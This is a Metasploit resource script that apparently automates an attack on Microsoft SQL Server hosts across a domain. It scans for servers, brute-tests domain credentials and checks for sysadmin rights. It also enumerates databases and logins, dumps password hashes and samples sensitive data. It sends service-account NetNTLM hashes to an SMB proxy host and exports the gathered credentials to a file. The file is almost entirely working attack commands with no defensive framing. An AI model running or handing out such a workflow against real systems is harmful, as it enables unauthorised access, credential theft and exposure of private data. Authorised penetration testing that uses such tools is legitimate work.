#---------------------------------
# Start logging
#---------------------------------
spool /tmp/msf-sql.log


#---------------------------------
# Setup global vars - UPDATE THIS
#---------------------------------
setg USERNAME User1
setg PASSWORD Password1
setg USE_WINDOWS_AUTHENT true
setg DOMAIN acme.com


#---------------------------------
# Identify live SQL Servers - UPDATE THIS
#---------------------------------
use auxiliary/scanner/mssql/mssql_ping
set rhosts file:///pentest/sql.txt
set threads 50
exploit


#---------------------------------
# Test access with domain creds
#---------------------------------
use auxiliary/scanner/mssql/mssql_login
set VERBOSE false
set THREADS 50
 
<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOSTS #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>


#---------------------------------
# Test for sysadmin access
#---------------------------------
use auxiliary/admin/mssql/mssql_sql
set VERBOSE false
set THREADS 50
set sql select \'server: \'  + @@servername + \',sysadmin: \' + cast(IS_SRVROLEMEMBER(\'sysadmin\') as varchar(10)) + \',links: \' + (select cast((select count(srvname) from master..sysservers) as varchar(10))) + \',clustered: \' + (select cast(SERVERPROPERTY(\'IsClustered\') as varchar(10))) as OUTPUT
 
<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOST #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>


#---------------------------------
# List accessible databases
#---------------------------------
use auxiliary/admin/mssql/mssql_sql
set VERBOSE false
set THREADS 50
set sql select name from master..sysdatabases where has_dbaccess(name)=1
 
<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOST #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>


#---------------------------------
# Dump accessible config info
#---------------------------------
use auxiliary/admin/mssql/mssql_enum
set VERBOSE false
 
<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOST #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>


#---------------------------------
# Dump password hashes if possible
#---------------------------------
use auxiliary/scanner/mssql/mssql_hashdump
set VERBOSE false
set THREADS 1
 
<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOSTS #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>

#---------------------------------
# Dump all of the SQL logins
#---------------------------------
use auxiliary/admin/mssql/mssql_enum_sql_logins
set FuzzNum 500
set VERBOSE false
 
<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOST #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>


#---------------------------------
# Dump sample of senstitve data
#---------------------------------
use auxiliary/admin/mssql/mssql_findandsampledata
set SAMPLE_SIZE 5
set VERBOSE true
 
<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOSTS #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>


#----------------------------------------
# Capture service account NetNTLM hashes 
#----------------------------------------
use auxiliary/admin/mssql/mssql_ntlm_stealer
set SMBPROXY 10.0.0.230
set VERBOSE false
set THREADS 50

<ruby>
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.name == "mssql" and service.state == "open"
      self.run_single("set RHOSTS #{host.address}")
      self.run_single("set RPORT #{service.port}")
      self.run_single("run")
    end
  end
end
</ruby>


#----------------------------------------
# Export list
#----------------------------------------
creds -o /tmp/msf-creds.csv
